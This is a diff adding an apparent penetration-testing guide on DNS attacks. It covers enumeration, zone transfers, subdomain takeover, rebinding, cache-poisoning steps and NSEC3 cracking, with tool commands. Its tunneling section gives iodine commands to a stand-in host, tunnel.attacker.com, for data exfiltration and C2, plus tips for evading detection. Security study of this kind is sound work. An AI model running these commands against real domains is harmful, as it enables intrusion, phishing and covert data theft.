@@ -1,0 +1,250 @@
+<vulnerability_guide>
+  <title>DNS POISONING AND ATTACKS</title>
+
+  <critical>DNS is the phone book of the internet - compromising DNS redirects victims to attacker-controlled infrastructure without touching their systems. DNS cache poisoning, zone transfer attacks, and subdomain takeover provide access to credentials, enable phishing, and facilitate man-in-the-middle attacks at scale.</critical>
+
+  <scope>
+    - DNS cache poisoning
+    - Zone transfer enumeration
+    - Subdomain takeover
+    - DNS tunneling detection
+    - DNS rebinding attacks
+    - DNSSEC vulnerabilities
+  </scope>
+
+  <methodology>
+    1. DNS ENUMERATION
+       {% raw %}
+       # Basic DNS queries
+       dig target.com ANY
+       dig target.com MX
+       dig target.com NS
+       dig target.com TXT
+
+       # Zone transfer attempt
+       dig axfr @ns1.target.com target.com
+       dnsrecon -d target.com -t axfr
+
+       # Subdomain enumeration
+       subfinder -d target.com
+       amass enum -d target.com
+       dnsrecon -d target.com -t brt -D wordlist.txt
+
+       # Reverse DNS
+       dnsrecon -d target.com -t rvl -r 10.0.0.0/24
+       {% endraw %}
+
+    2. CACHE POISONING BASICS
+       {% raw %}
+       # Classic Kaminsky attack concept:
+       # 1. Send many queries for random.target.com
+       # 2. Race to inject forged response
+       # 3. Forged response includes NS glue record
+       # 4. Resolver caches poisoned NS
+
+       # Modern mitigations:
+       # - Source port randomization
+       # - Transaction ID randomization
+       # - DNSSEC validation
+
+       # Testing for vulnerable resolvers:
+       # Check if source port is static
+       for i in {1..5}; do dig +short @resolver target.com; done
+       # Monitor source ports
+
+       # Check TXID predictability
+       # Capture traffic, analyze patterns
+       {% endraw %}
+
+    3. ZONE TRANSFER EXPLOITATION
+       {% raw %}
+       # Zone transfer leaks full DNS zone
+
+       # AXFR request
+       dig axfr @ns1.target.com target.com
+
+       # If successful, reveals:
+       # - All subdomains
+       # - Internal hostnames
+       # - Mail servers
+       # - SPF/DKIM/DMARC records
+       # - TXT records (may contain secrets)
+
+       # Automated checking
+       dnsrecon -d target.com -t axfr
+       fierce --domain target.com
+       {% endraw %}
+
+    4. SUBDOMAIN TAKEOVER
+       {% raw %}
+       # Find dangling DNS records
+
+       # Check for CNAME to unclaimed resources
+       dig subdomain.target.com CNAME
+       # Returns: subdomain.target.com -> something.cloudapp.net
+
+       # Verify resource is unclaimed
+       curl -I something.cloudapp.net
+       # 404 or claim page = takeover possible
+
+       # Common takeover targets:
+       # - Azure (*.azurewebsites.net)
+       # - AWS S3 (*.s3.amazonaws.com)
+       # - Heroku (*.herokuapp.com)
+       # - GitHub Pages (*.github.io)
+       # - Shopify (*.myshopify.com)
+
+       # Automated detection
+       subjack -w subdomains.txt -t 100
+       nuclei -t takeovers/ -l subdomains.txt
+       {% endraw %}
+
+    5. DNS REBINDING
+       {% raw %}
+       # Bypass same-origin policy
+
+       # Attack flow:
+       # 1. Victim visits attacker.com
+       # 2. attacker.com resolves to attacker IP (script loaded)
+       # 3. DNS TTL expires quickly
+       # 4. attacker.com re-resolves to 127.0.0.1 or internal IP
+       # 5. JavaScript now accesses "same origin" internal resources
+
+       # Setup:
+       # - DNS server returning different IPs
+       # - Very low TTL (0-1 seconds)
+       # - Malicious JavaScript
+
+       # Targets:
+       # - Localhost services
+       # - Internal network resources
+       # - IoT devices
+       # - Development servers
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <fragmentation_attacks>
+      {% raw %}
+      # DNS response fragmentation
+
+      # Large DNS responses may fragment
+      # Second fragment can be spoofed easier
+
+      # Attack steps:
+      # 1. Query for record with large response
+      # 2. Capture first fragment (has TXID)
+      # 3. Inject spoofed second fragment
+      # 4. Fragments reassembled with poison
+
+      # Effective against DNSSEC too
+      # If key material in second fragment
+      {% endraw %}
+    </fragmentation_attacks>
+
+    <nxdomain_poisoning>
+      {% raw %}
+      # Poison negative cache
+
+      # Query for nonexistent.target.com
+      # Inject NXDOMAIN with SOA + glue
+
+      # Benefits:
+      # - Fewer legitimate responses to race
+      # - SOA can contain NS glue
+
+      # Impact:
+      # - All queries for subdomain controlled
+      # - Entire zone can be redirected
+      {% endraw %}
+    </nxdomain_poisoning>
+
+    <dns_tunneling>
+      {% raw %}
+      # Exfiltrate data through DNS
+
+      # Encode data in subdomain
+      # base64data.tunnel.attacker.com
+
+      # Tools:
+      iodine -f tunnel.attacker.com  # Client
+      iodined -f 10.0.0.1 tunnel.attacker.com  # Server
+
+      dnscat2  # C2 over DNS
+
+      # Detection evasion:
+      # - Use common record types (A, AAAA, TXT)
+      # - Limit query rate
+      # - Randomize subdomain lengths
+      {% endraw %}
+    </dns_tunneling>
+
+    <dnssec_attacks>
+      {% raw %}
+      # DNSSEC vulnerabilities
+
+      # Zone walking (NSEC)
+      # Enumerate all records via NSEC chain
+      ldns-walk target.com
+
+      # NSEC3 hash cracking
+      # NSEC3 hashes can be cracked offline
+      nsec3walker target.com
+      hashcat -m 8300 nsec3_hashes.txt wordlist.txt
+
+      # Key rollover attacks
+      # During key rotation, brief window may exist
+
+      # Algorithm downgrade
+      # Force use of weaker signing algorithm
+      {% endraw %}
+    </dnssec_attacks>
+
+    <passive_dns>
+      {% raw %}
+      # Historical DNS intelligence
+
+      # Passive DNS databases:
+      # - VirusTotal
+      # - SecurityTrails
+      # - RiskIQ
+      # - Farsight DNSDB
+
+      # Find:
+      # - Historical subdomains
+      # - Previous IP addresses
+      # - Related domains
+      # - Certificate transparency
+
+      # Old records may point to decommissioned but vulnerable infrastructure
+      {% endraw %}
+    </passive_dns>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor for zone transfer attempts
+    - Track unusual DNS query patterns
+    - Alert on CNAME to unowned resources
+    - Check for DNS tunneling signatures
+    - Validate DNSSEC where deployed
+  </detection>
+
+  <validation>
+    - Successfully enumerate subdomains
+    - Identify zone transfer vulnerabilities
+    - Find takeover-able subdomains
+    - Demonstrate DNS rebinding
+    - Document cache poisoning feasibility
+  </validation>
+
+  <pro_tips>
+    - Zone transfers often work on secondary nameservers
+    - Subdomain takeover = hosting under trusted domain
+    - DNS rebinding bypasses IP-based restrictions
+    - Passive DNS reveals decommissioned infrastructure
+    - DNSSEC zone walking enumerates protected zones
+    - Internal DNS is often less secured than external
+  </pro_tips>
+
+  <remember>DNS is infrastructure - users trust DNS responses implicitly. Subdomain takeover puts attacker content under the victim's trusted domain. Cache poisoning redirects entire populations to malicious servers. DNS rebinding bridges the gap between internet and intranet. Controlling DNS means controlling trust.</remember>
+</vulnerability_guide>
